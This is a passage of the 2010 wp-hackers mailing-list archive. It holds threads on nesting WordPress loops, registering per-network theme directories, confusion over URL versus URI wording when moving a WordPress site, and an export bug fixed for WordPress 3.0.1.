> global. Is there a way where I can call the WP_QUERY object and
> retrieve it values without it affecting the other loop?


You have three loops there, with one unused... One isn't closed, and the if
statement isn't properly opened, so it also can't be closed.

That said, one option is to call the_post() again on the main loop. Or use a
variant technique for sub loops.

From eric at eamann.com  Tue Jul 20 19:56:16 2010
From: eric at eamann.com (Eric Mann)
Date: Tue, 20 Jul 2010 12:56:16 -0700 (PDT)
Subject: [wp-hackers] Loop Within A Loop
In-Reply-To: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
References: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
Message-ID: <1099658874.449152.1279655776820.JavaMail.open-xchange@oxusltgw09.schlund.de>

I think I know what you're trying to do, but I've never called it a loop within
a loop before.
?
Basically, you need to store the "main" loop's query when you run the second
loop. ?Then restore it before closing the loop and things should work out well.
?
There are some pretty good examples in the
Codex:?http://codex.wordpress.org/The_Loop#Multiple_Loops_Example_2
?

On July 20, 2010 at 7:46 PM Devin Dixon <devin at tayloegray.com> wrote:

> Hey everyone,
> I am having a problem where I need to call a loop within a loop.The
> code looks somethign like this
>
> ?if ( have_posts() ) while ( have_posts() ) : the_post();
>
> ?? ? ??while ( $loop->have_posts() ) : $loop->the_post();
>
> ?? ? ? ? ??$wp_query= new WP_Query( array( 'post_type' =>
> "$post_type", 'posts_per_page' => $post_per_page , 'post_parent' =>
>? ? ? ? ? ? ? ? ?$parent_post , 'author' => "$author" ) );
>
> ?while ($wp_query->have_posts()) : $wp_query->the_post();
>
> ?>
>
> <a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent
> Link to <?php the_title_attribute(); ?>"><?php ? ? ? ?the_title();
> ?></a>
>
> <?php
>
> ? ?? ??endwhile;
>
> ?? ? ? ?endwhile;
>
> endif;
>
> The problem is, the class WP_QUERY automatically makes everything
> global. Is there a way where I can call the WP_QUERY object and
> retrieve it values without it affecting the other loop?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From mikeschinkel at newclarity.net  Tue Jul 20 20:29:58 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 20 Jul 2010 16:29:58 -0400
Subject: [wp-hackers] Loop Within A Loop
In-Reply-To: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
References: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
Message-ID: <56F38644-6A1D-4380-A4D6-C399A45AF3F1@newclarity.net>

> I am having a problem where I need to call a loop within a loop.

The loop calls setup_postdata() to set $post and other global variables and I think that's where you have some problems.  One related area where I've run into trouble is the need to call "get_the_content()" and use a specified post instead of the global one. Here is the code I use to do that (it's hackishly ugly, but it's because that's what I think I have to do to get around the limitations inherent in WordPress):

		function get_post_content($this_post=false) {
			if ($this_post) {
				global $post, $id, $authordata, $day, $currentmonth, $page, $pages, $multipage, $more, $numpages;
				$save = array($post, $id, $authordata, $day, $currentmonth, $page, $pages, $multipage, $more, $numpages);
				setup_postdata($this_post);
			}
			$content = get_the_content();
			if ($this_post)
				list($post, $id, $authordata, $day, $currentmonth, $page, $pages, $multipage, $more, $numpages) = $save;
			return $content;
		}

You could also create some "get/set" functions to make this more usable in your nested loops, for example (I'd love to see these two functions added to WordPress core, actually):

		function get_postdata($new_post=false) {
			global $post, $id, $authordata, $day, $currentmonth, $page, $pages, $multipage, $more, $numpages;
			$postdata = array($post, $id, $authordata, $day, $currentmonth, $page, $pages, $multipage, $more, $numpages);
			if ($new_post) 
				setup_postdata($new_post);
			return $postdata;
		}
		static function set_postdata($postdata) {
			global $post, $id, $authordata, $day, $currentmonth, $page, $pages, $multipage, $more, $numpages;
			list($post, $id, $authordata, $day, $currentmonth, $page, $pages, $multipage, $more, $numpages) = $postdata;
		}

Of course I could be doing this all wrong and if so I'd love for someone to tell me how I can do this better so it doesn't have to be so hackish.

-Mike

From wp-hackers at nicolaskuttler.de  Tue Jul 20 20:36:00 2010
From: wp-hackers at nicolaskuttler.de (Nicolas Kuttler)
Date: Tue, 20 Jul 2010 22:36:00 +0200
Subject: [wp-hackers] Loop Within A Loop
In-Reply-To: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
References: <AANLkTikJEyhErTZxUxg_siL6LMnIbeaAREpwphHqxaGh@mail.gmail.com>
Message-ID: <20100720203600.GD15799@nicolaskuttler.de>

On Tue, Jul 20, 2010 at 03:46:59PM -0400, Devin Dixon wrote:
> The problem is, the class WP_QUERY automatically makes everything
> global. Is there a way where I can call the WP_QUERY object and
> retrieve it values without it affecting the other loop?

wp_reset_postdata() restores the global $post, if that's what you need

Nicolas

--
Nicolas Kuttler
wp at nkuttler.de

http://www.nkuttler.de
http://www.nicolaskuttler.de (deutsch)

From harper.shelby at parivedasolutions.com  Tue Jul 20 21:59:14 2010
From: harper.shelby at parivedasolutions.com (Shelby, Harper)
Date: Tue, 20 Jul 2010 16:59:14 -0500
Subject: [wp-hackers] Filtering Themes visible for a particular network
Message-ID: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>

I've been asked to implement theme filtering for a multi-network installation, so that network admins only see those themes which "belong" to them. In the existing installation (on MU 2.9.2), this was done by altering wpmu-themes to check for a Tags value in the theme's CSS file and filtering based on that. I'm trying to move this implementation into a plugin to reduce changes to the core code. Digging into the code, I don't see any action or filter hooks being called in ms-themes.php, so I suspect my best course of action is to move themes into network-specific subdirectories of wp-content/themes, then alter the include path in an admin_init hook to bring in the proper theme directory. Is there a better way to implement this, or are there any potential risks that I haven't seen in this course of action?

Thanks,

Harper Shelby



The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.

From wp at andrewnacin.com  Tue Jul 20 22:10:55 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 20 Jul 2010 18:10:55 -0400
Subject: [wp-hackers] Filtering Themes visible for a particular network
In-Reply-To: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
References: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
Message-ID: <AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>

On Tue, Jul 20, 2010 at 5:59 PM, Shelby, Harper <
harper.shelby at parivedasolutions.com> wrote:

> I've been asked to implement theme filtering for a multi-network
> installation, so that network admins only see those themes which "belong" to
> them. In the existing installation (on MU 2.9.2), this was done by altering
> wpmu-themes to check for a Tags value in the theme's CSS file and filtering
> based on that. I'm trying to move this implementation into a plugin to
> reduce changes to the core code. Digging into the code, I don't see any
> action or filter hooks being called in ms-themes.php, so I suspect my best
> course of action is to move themes into network-specific subdirectories of
> wp-content/themes, then alter the include path in an admin_init hook to
> bring in the proper theme directory. Is there a better way to implement
> this, or are there any potential risks that I haven't seen in this course of
> action?
>

You can indeed register theme directories in a plugin. In fact that seems
like a very sane way of doing this (as long as you don't expect a theme to
be used across networks).

From wp at andrewnacin.com  Tue Jul 20 22:17:20 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 20 Jul 2010 18:17:20 -0400
Subject: [wp-hackers] Filtering Themes visible for a particular network
In-Reply-To: <AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
References: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
	<AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
Message-ID: <AANLkTinXQ_gXC36KmPRUCR96oqUn-rKrBGNLP308H2rC@mail.gmail.com>

On Tue, Jul 20, 2010 at 6:10 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Jul 20, 2010 at 5:59 PM, Shelby, Harper <
> harper.shelby at parivedasolutions.com> wrote:
>
>> I've been asked to implement theme filtering for a multi-network
>> installation, so that network admins only see those themes which "belong" to
>> them. In the existing installation (on MU 2.9.2), this was done by altering
>> wpmu-themes to check for a Tags value in the theme's CSS file and filtering
>> based on that. I'm trying to move this implementation into a plugin to
>> reduce changes to the core code. Digging into the code, I don't see any
>> action or filter hooks being called in ms-themes.php, so I suspect my best
>> course of action is to move themes into network-specific subdirectories of
>> wp-content/themes, then alter the include path in an admin_init hook to
>> bring in the proper theme directory. Is there a better way to implement
>> this, or are there any potential risks that I haven't seen in this course of
>> action?
>>
>
> You can indeed register theme directories in a plugin. In fact that seems
> like a very sane way of doing this (as long as you don't expect a theme to
> be used across networks).
>

What I meant was, no need for admin_init modifications or anything of the
sort. Check out register_theme_directory(). So you could simply have a
plugin that calls register_theme_directory( WP_CONTENT_DIR .
'/network-themes/' . $current_site->site_id ); and you'd be good to go.

Also, I'd upgrade to 3.0 when you can (perhaps with 3.0.1), there's a decent
number of MU improvements and bug fixes that went into that release.

From harper.shelby at parivedasolutions.com  Tue Jul 20 22:15:23 2010
From: harper.shelby at parivedasolutions.com (Shelby, Harper)
Date: Tue, 20 Jul 2010 17:15:23 -0500
Subject: [wp-hackers] Filtering Themes visible for a particular network
In-Reply-To: <AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
References: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
	<AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
Message-ID: <2BB24BBC87D490418DE901138ACDA0DB42092C88B6@srv-exch-02.pariveda.local>

Thanks for the verification.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew Nacin
Sent: Tuesday, July 20, 2010 5:11 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

On Tue, Jul 20, 2010 at 5:59 PM, Shelby, Harper <
harper.shelby at parivedasolutions.com> wrote:

> I've been asked to implement theme filtering for a multi-network
> installation, so that network admins only see those themes which "belong" to
> them. In the existing installation (on MU 2.9.2), this was done by altering
> wpmu-themes to check for a Tags value in the theme's CSS file and filtering
> based on that. I'm trying to move this implementation into a plugin to
> reduce changes to the core code. Digging into the code, I don't see any
> action or filter hooks being called in ms-themes.php, so I suspect my best
> course of action is to move themes into network-specific subdirectories of
> wp-content/themes, then alter the include path in an admin_init hook to
> bring in the proper theme directory. Is there a better way to implement
> this, or are there any potential risks that I haven't seen in this course of
> action?
>

You can indeed register theme directories in a plugin. In fact that seems
like a very sane way of doing this (as long as you don't expect a theme to
be used across networks).
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.

From harper.shelby at parivedasolutions.com  Tue Jul 20 22:16:49 2010
From: harper.shelby at parivedasolutions.com (Shelby, Harper)
Date: Tue, 20 Jul 2010 17:16:49 -0500
Subject: [wp-hackers] Filtering Themes visible for a particular network
In-Reply-To: <AANLkTinXQ_gXC36KmPRUCR96oqUn-rKrBGNLP308H2rC@mail.gmail.com>
References: <2BB24BBC87D490418DE901138ACDA0DB42092C8893@srv-exch-02.pariveda.local>
	<AANLkTilnSW5FBMRJjHWIWWl_p_V8RSop44dYFEig4_lF@mail.gmail.com>
	<AANLkTinXQ_gXC36KmPRUCR96oqUn-rKrBGNLP308H2rC@mail.gmail.com>
Message-ID: <2BB24BBC87D490418DE901138ACDA0DB42092C88BD@srv-exch-02.pariveda.local>

Even better - I'd missed that function. We are actually upgrading to 3.0 - part of the reason for these changes is to make the overall installation more upgrade-safe and keep the customizations in plugins and/or themes as appropriate.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Andrew Nacin
Sent: Tuesday, July 20, 2010 5:17 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Filtering Themes visible for a particular network

On Tue, Jul 20, 2010 at 6:10 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Jul 20, 2010 at 5:59 PM, Shelby, Harper <
> harper.shelby at parivedasolutions.com> wrote:
>
>> I've been asked to implement theme filtering for a multi-network
>> installation, so that network admins only see those themes which "belong" to
>> them. In the existing installation (on MU 2.9.2), this was done by altering
>> wpmu-themes to check for a Tags value in the theme's CSS file and filtering
>> based on that. I'm trying to move this implementation into a plugin to
>> reduce changes to the core code. Digging into the code, I don't see any
>> action or filter hooks being called in ms-themes.php, so I suspect my best
>> course of action is to move themes into network-specific subdirectories of
>> wp-content/themes, then alter the include path in an admin_init hook to
>> bring in the proper theme directory. Is there a better way to implement
>> this, or are there any potential risks that I haven't seen in this course of
>> action?
>>
>
> You can indeed register theme directories in a plugin. In fact that seems
> like a very sane way of doing this (as long as you don't expect a theme to
> be used across networks).
>

What I meant was, no need for admin_init modifications or anything of the
sort. Check out register_theme_directory(). So you could simply have a
plugin that calls register_theme_directory( WP_CONTENT_DIR .
'/network-themes/' . $current_site->site_id ); and you'd be good to go.

Also, I'd upgrade to 3.0 when you can (perhaps with 3.0.1), there's a decent
number of MU improvements and bug fixes that went into that release.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.

From bernard.d.tremblay at gmail.com  Tue Jul 20 23:22:59 2010
From: bernard.d.tremblay at gmail.com (Bernard D. Tremblay (ben))
Date: Tue, 20 Jul 2010 17:22:59 -0600
Subject: [wp-hackers] URL | URI ... not all mammals are dogs.
In-Reply-To: <mailman.11360.1279626315.1338.wp-hackers@lists.automattic.com>
References: <mailman.11360.1279626315.1338.wp-hackers@lists.automattic.com>
Message-ID: <4C462FD3.9080207@gmail.com>

Hi -

A while back I created a sub-directory to host a sub-domain. And then 
another and another til my dir structure was a mess.
Then it dawned on me that I could tuck those sub-dom's in sub-dirs.
And then *whack* ohhhh right, dear WP might not be too happy moving.
HeyHo, my bad.

Well ... stopped dead by a matter of technical precision and rigour.
All URLs are a URI, ayep, a special and specific type.
Not all URIs are URLs.

see my (frustrated to the limit of my patience) explication on Discussion
http://codex.wordpress.org/Talk:Moving_WordPress

====
Ouch! It's my bad, my mistake, I shouldn't have to do this, but ouch! I 
want clarity here, not ambiguity. You tell me where to go in Admin, I'm 
there. You tell me to change the two URIs, I'm with you. But when what I 
find is two URLs, I'm wondering what's going on. And I don't want to 
wonder. I want clarity. And yes, there's a good chance that because 
you're expert and could do this in your sleep you see me as showing how 
stupid and inept I am. But I'm not expert. If I could do this in my 
sleep I wouldn't be sitting here keyboarding in Codex after coming to 
Codex for detailed instructions. see 
http://bentrem.sycks.net/images/wp-move.jpg ... I see two URLs. Is that 
what you mean? You went to the trouble of being precise: URI is what you 
wrote. Please correct / clarify / update, whatever. In the meantime, I'm 
screwed and I stay screwed. */*OUCH*/!* --bentrem </User:Bentrem> 19:30, 
20 July 2010 (UTC)

    I had someone on Twitter question my contra-distinction
    <http://twitter.com/bertil_hatt/status/19024534406> [1], someone who
    knows his craft. Off the cuff I would have said "If you want URL
    then you'll get something like http://bla-yada or ftp://yada-blah;
    if it looks like a directory then it's URI, not URL. But heh URL is
    a URI too! But not all URIs are URLs. Not all dogs are fine handsome
    English Springer Spaniels
    <http://www.flickr.com/photos/bentrem/2952005281/>[2]." Instead I
    looked, found, and quoted TimBL
    <http://twitter.com/bentrem/status/19028507460>[3].
    So: if WP3 just wants the URL, then happy happy happy I don't have
    to change a thing all I need do is re-direct that domain, move the
    files, and I'm off to the races. And if it requires the URI then
    fine I will scrupulously enter the correct URI, pointing to the new
    directory in the new directory (which is being mapped to that URL)
    and then move the files.
    Either way. But don't please don't state the requirement
    ambiguously. If it's URL you want, please say so. If any old
    (correct) URI will do then fine, I'll leave it as
    http://my.domain.com ... right now I'm not sure that's ok.
    And yes, from my reading, if I move the files and make a mistake
    /that *will corrupt the database*/.
    So it matters to me. (It's already a dog's breakfast because import
    from Livejournal failed in mode X and import from Blogger.com failed
    in mode Y, the consequences of which I gave up trying to correct.)
    --bentrem </User:Bentrem> 23:10, 20 July 2010 (UTC)

[1] http://twitter.com/bertil_hatt/status/19024534406
[2] http://www.flickr.com/photos/bentrem/2952005281/
[3] http://twitter.com/bentrem/status/19028507460

If http://gnodal.protension.com/journal/ points to 
/user/bntrm/protension.com/gnodal.protension/journal then the files in 
that directory will be served.
But I'm not sure moving WP will work. The URL (strictly, strictly, 
strictly) the URL will remain the same. The URI will not.
It might work. It might not.
Because the terms (acronyms) seem to have been confounded (most folk 
take them as synonymous ... as though all mammals are dogs) I don't know.
I don't like not knowing.

I like "Ben, your initial decision was sub-optimal. Consequently you 
need to fire up PHPmyADMIN and get to work." That I can work with ... 
hammer & tongs ... nuts & botls ... brass-tacks ... another day in the 
salt-mines.
But I can't get to work.
I'm stopped dead.
Because I don't know.
And that doesn't make me happy.

ben

p.s. yes yes yes because you're an expert this is all perfectly clear to 
you. so because I'm not an expert I'm an idiot who deserves to be 
sitting here pounding my bloody face into the sharp corner of my desk? 
because the docs aren't clear? because 1 says URI and the other URL so I 
trust neither? Gee, NORAD/SAC liked my work when I pulled their 
microwave network out of the ditch. And that avionics R&D company was 
happy with the way I rescued their MIL-SPEC documentation effort. can 
you see how I resent being made to feel sub-human because I'm having to 
deal with this particular social group? freakin' years of this ... I'm 
//really really really// sorry I don't come up to your refractory social 
standards. *NOT!* "Thank you for flying Air WordPress". (CamelCase, of 
course ... ThereIsNoOther.)

--
If you look to see how the system works
Likely you will find that it doesn't.

From wordpress at santosj.name  Tue Jul 20 23:36:46 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 20 Jul 2010 18:36:46 -0500
Subject: [wp-hackers] URL | URI ... not all mammals are dogs.
In-Reply-To: <4C462FD3.9080207@gmail.com>
References: <mailman.11360.1279626315.1338.wp-hackers@lists.automattic.com>
	<4C462FD3.9080207@gmail.com>
Message-ID: <4C46330E.7020700@santosj.name>

If I understand what you are saying, the problem you are having is that 
since you changed from one location, i.e. sub.domain.com to 
domain.com/sub. You discovered that the site no longer worked, since it 
was trying to redirect to sub.domain.com. After some research, you 
discovered an article that stated that in the database, there are two 
options that need to be edited. This either has to be done before you 
move the files in wp-admin or in the database, which is unfortunate or 
you can set the WP_HOME and WP_SITEURL constants in wp-config.php.

Parsing through the crazy, err, rest of the email, I suppose you are 
upset that there isn't a more refined method to fix the situation. I 
have to agree, but discussions towards a more refined way tend towards 
issues with how the Home and Site URL are configured. This is required 
to be known before hand and it is extremely difficult to do if WordPress 
is in a directory. The algorithms are flawed and while they might work 
for majority of cases, it is the minority that prevents such a solution 
from being in WordPress. Every web application has this problem and most 
require even more manual intervention for defining where the web app 
resides on the URI (not so much a problem if Permalinks is turned off).

For WordPress MultiSite, you might want to try the networking plugin 
that allows for multiple domains.

Most likely this will be my only reply, please note that I'm not flaming 
you and any thing that might seem that way is a mistake and I apologize 
up-front now for any misgivings that you might have with my reply.

Jacob Santos

On 7/20/2010 6:22 PM, Bernard D. Tremblay (ben) wrote:
> Hi -
>
> A while back I created a sub-directory to host a sub-domain. And then 
> another and another til my dir structure was a mess.
> Then it dawned on me that I could tuck those sub-dom's in sub-dirs.
> And then *whack* ohhhh right, dear WP might not be too happy moving.
> HeyHo, my bad.
>
> Well ... stopped dead by a matter of technical precision and rigour.
> All URLs are a URI, ayep, a special and specific type.
> Not all URIs are URLs.
>
> see my (frustrated to the limit of my patience) explication on Discussion
> http://codex.wordpress.org/Talk:Moving_WordPress
>
> ====
> Ouch! It's my bad, my mistake, I shouldn't have to do this, but ouch! 
> I want clarity here, not ambiguity. You tell me where to go in Admin, 
> I'm there. You tell me to change the two URIs, I'm with you. But when 
> what I find is two URLs, I'm wondering what's going on. And I don't 
> want to wonder. I want clarity. And yes, there's a good chance that 
> because you're expert and could do this in your sleep you see me as 
> showing how stupid and inept I am. But I'm not expert. If I could do 
> this in my sleep I wouldn't be sitting here keyboarding in Codex after 
> coming to Codex for detailed instructions. see 
> http://bentrem.sycks.net/images/wp-move.jpg ... I see two URLs. Is 
> that what you mean? You went to the trouble of being precise: URI is 
> what you wrote. Please correct / clarify / update, whatever. In the 
> meantime, I'm screwed and I stay screwed. */*OUCH*/!* --bentrem 
> </User:Bentrem> 19:30, 20 July 2010 (UTC)
>
>    I had someone on Twitter question my contra-distinction
> <http://twitter.com/bertil_hatt/status/19024534406> [1], someone who
>    knows his craft. Off the cuff I would have said "If you want URL
>    then you'll get something like http://bla-yada or ftp://yada-blah;
>    if it looks like a directory then it's URI, not URL. But heh URL is
>    a URI too! But not all URIs are URLs. Not all dogs are fine handsome
>    English Springer Spaniels
> <http://www.flickr.com/photos/bentrem/2952005281/>[2]." Instead I
>    looked, found, and quoted TimBL
> <http://twitter.com/bentrem/status/19028507460>[3].
>    So: if WP3 just wants the URL, then happy happy happy I don't have
>    to change a thing all I need do is re-direct that domain, move the
>    files, and I'm off to the races. And if it requires the URI then
>    fine I will scrupulously enter the correct URI, pointing to the new
>    directory in the new directory (which is being mapped to that URL)
>    and then move the files.
>    Either way. But don't please don't state the requirement
>    ambiguously. If it's URL you want, please say so. If any old
>    (correct) URI will do then fine, I'll leave it as
>    http://my.domain.com ... right now I'm not sure that's ok.
>    And yes, from my reading, if I move the files and make a mistake
>    /that *will corrupt the database*/.
>    So it matters to me. (It's already a dog's breakfast because import
>    from Livejournal failed in mode X and import from Blogger.com failed
>    in mode Y, the consequences of which I gave up trying to correct.)
>    --bentrem </User:Bentrem> 23:10, 20 July 2010 (UTC)
>
> [1] http://twitter.com/bertil_hatt/status/19024534406
> [2] http://www.flickr.com/photos/bentrem/2952005281/
> [3] http://twitter.com/bentrem/status/19028507460
>
> If http://gnodal.protension.com/journal/ points to 
> /user/bntrm/protension.com/gnodal.protension/journal then the files in 
> that directory will be served.
> But I'm not sure moving WP will work. The URL (strictly, strictly, 
> strictly) the URL will remain the same. The URI will not.
> It might work. It might not.
> Because the terms (acronyms) seem to have been confounded (most folk 
> take them as synonymous ... as though all mammals are dogs) I don't know.
> I don't like not knowing.
>
> I like "Ben, your initial decision was sub-optimal. Consequently you 
> need to fire up PHPmyADMIN and get to work." That I can work with ... 
> hammer & tongs ... nuts & botls ... brass-tacks ... another day in the 
> salt-mines.
> But I can't get to work.
> I'm stopped dead.
> Because I don't know.
> And that doesn't make me happy.
>
> ben
>
> p.s. yes yes yes because you're an expert this is all perfectly clear 
> to you. so because I'm not an expert I'm an idiot who deserves to be 
> sitting here pounding my bloody face into the sharp corner of my desk? 
> because the docs aren't clear? because 1 says URI and the other URL so 
> I trust neither? Gee, NORAD/SAC liked my work when I pulled their 
> microwave network out of the ditch. And that avionics R&D company was 
> happy with the way I rescued their MIL-SPEC documentation effort. can 
> you see how I resent being made to feel sub-human because I'm having 
> to deal with this particular social group? freakin' years of this ... 
> I'm //really really really// sorry I don't come up to your refractory 
> social standards. *NOT!* "Thank you for flying Air WordPress". 
> (CamelCase, of course ... ThereIsNoOther.)
>
> -- 
> If you look to see how the system works
> Likely you will find that it doesn't.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From dangayle at gmail.com  Wed Jul 21 01:26:00 2010
From: dangayle at gmail.com (Dan Gayle)
Date: Tue, 20 Jul 2010 18:26:00 -0700
Subject: [wp-hackers] URL | URI ... not all mammals are dogs.
In-Reply-To: <4C46330E.7020700@santosj.name>
References: <mailman.11360.1279626315.1338.wp-hackers@lists.automattic.com>
	<4C462FD3.9080207@gmail.com> <4C46330E.7020700@santosj.name>
Message-ID: <AANLkTinxl20KBzwl7Fbh04u6dZvWu8XYYqb0a8wOCm3r@mail.gmail.com>

+1 Jacob Santos for politeness

From jimmy.roy at gmail.com  Wed Jul 21 03:42:34 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Wed, 21 Jul 2010 11:42:34 +0800
Subject: [wp-hackers] WP3.0 : export doesn't works!
Message-ID: <AANLkTimyVZ5Y0K4x653kS1miVoWSq8ZOGglXEqDSQcAb@mail.gmail.com>

hi all,
today I try to export my WP data using the export page, I click on the
"download export file" button and it doesn't save the xml file... the file
is directly open in the same windows, I run it under Google Chrome for Mac
OS X and Firefox.

I got these error messages:

Warning: strip_tags() expects parameter 1 to be string, array given in
/www/mydomainname/www/wp-includes/formatting.php on line 2773

Warning: Cannot modify header information - headers already sent by (output
started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
/www/mydomainname/www/wp-admin/includes/export.php on line 44

Warning: Cannot modify header information - headers already sent by (output
started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
/www/mydomainname/www/wp-admin/includes/export.php on line 45

Warning: Cannot modify header information - headers already sent by (output
started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
/www/mydomainname/www/wp-admin/includes/export.php on line 46


I also try on another WP3.0 site and it works fine.
--
Jimmy | www.jimmyroy.fr
--

From aaron at jorb.in  Wed Jul 21 03:49:06 2010
From: aaron at jorb.in (Aaron Jorbin)
Date: Tue, 20 Jul 2010 23:49:06 -0400
Subject: [wp-hackers] WP3.0 : export doesn't works!
In-Reply-To: <AANLkTimyVZ5Y0K4x653kS1miVoWSq8ZOGglXEqDSQcAb@mail.gmail.com>
References: <AANLkTimyVZ5Y0K4x653kS1miVoWSq8ZOGglXEqDSQcAb@mail.gmail.com>
Message-ID: <AANLkTikzHasMxx068NTF7LLQiQQyXa6Qck4dLQ1pq2x9@mail.gmail.com>

It's a known issue that has been patched in the upcoming 3.0.1.

Tickets:
http://core.trac.wordpress.org/ticket/14026
http://core.trac.wordpress.org/ticket/14213

http://aaron.jorb.in
twitter: twitter.com/aaronjorbin


On Tue, Jul 20, 2010 at 11:42 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:

> hi all,
> today I try to export my WP data using the export page, I click on the
> "download export file" button and it doesn't save the xml file... the file
> is directly open in the same windows, I run it under Google Chrome for Mac
> OS X and Firefox.
>
> I got these error messages:
>
> Warning: strip_tags() expects parameter 1 to be string, array given in
> /www/mydomainname/www/wp-includes/formatting.php on line 2773
>
> Warning: Cannot modify header information - headers already sent by (output
> started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> /www/mydomainname/www/wp-admin/includes/export.php on line 44
>
> Warning: Cannot modify header information - headers already sent by (output
> started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> /www/mydomainname/www/wp-admin/includes/export.php on line 45
>
> Warning: Cannot modify header information - headers already sent by (output
> started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> /www/mydomainname/www/wp-admin/includes/export.php on line 46
>
>
> I also try on another WP3.0 site and it works fine.
> --
> Jimmy | www.jimmyroy.fr
> --
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jimmy.roy at gmail.com  Wed Jul 21 03:55:58 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Wed, 21 Jul 2010 11:55:58 +0800
Subject: [wp-hackers] WP3.0 : export doesn't works!
In-Reply-To: <AANLkTikzHasMxx068NTF7LLQiQQyXa6Qck4dLQ1pq2x9@mail.gmail.com>
References: <AANLkTimyVZ5Y0K4x653kS1miVoWSq8ZOGglXEqDSQcAb@mail.gmail.com>
	<AANLkTikzHasMxx068NTF7LLQiQQyXa6Qck4dLQ1pq2x9@mail.gmail.com>
Message-ID: <AANLkTiki_MHpGEk7be0T4cgbWROmUBVEU67RD2J-EYDb@mail.gmail.com>

ok, thank u.
it happens only on some hosting.
Kalyhost : KO
OVH : OK

--
Jimmy | www.jimmyroy.fr
--



2010/7/21 Aaron Jorbin <aaron at jorb.in>

> It's a known issue that has been patched in the upcoming 3.0.1.
>
> Tickets:
> http://core.trac.wordpress.org/ticket/14026
> http://core.trac.wordpress.org/ticket/14213
>
> http://aaron.jorb.in
> twitter: twitter.com/aaronjorbin
>
>
> On Tue, Jul 20, 2010 at 11:42 PM, Jimmy Roy <jimmy.roy at gmail.com> wrote:
>
> > hi all,
> > today I try to export my WP data using the export page, I click on the
> > "download export file" button and it doesn't save the xml file... the
> file
> > is directly open in the same windows, I run it under Google Chrome for
> Mac
> > OS X and Firefox.
> >
> > I got these error messages:
> >
> > Warning: strip_tags() expects parameter 1 to be string, array given in
> > /www/mydomainname/www/wp-includes/formatting.php on line 2773
> >
> > Warning: Cannot modify header information - headers already sent by
> (output
> > started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> > /www/mydomainname/www/wp-admin/includes/export.php on line 44
> >
> > Warning: Cannot modify header information - headers already sent by
> (output
> > started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> > /www/mydomainname/www/wp-admin/includes/export.php on line 45
> >
> > Warning: Cannot modify header information - headers already sent by
> (output
> > started at /www/mydomainname/www/wp-includes/formatting.php:2773) in
> > /www/mydomainname/www/wp-admin/includes/export.php on line 46
> >
> >
> > I also try on another WP3.0 site and it works fine.
> > --
> > Jimmy | www.jimmyroy.fr
> > --
> > _______________________________________________
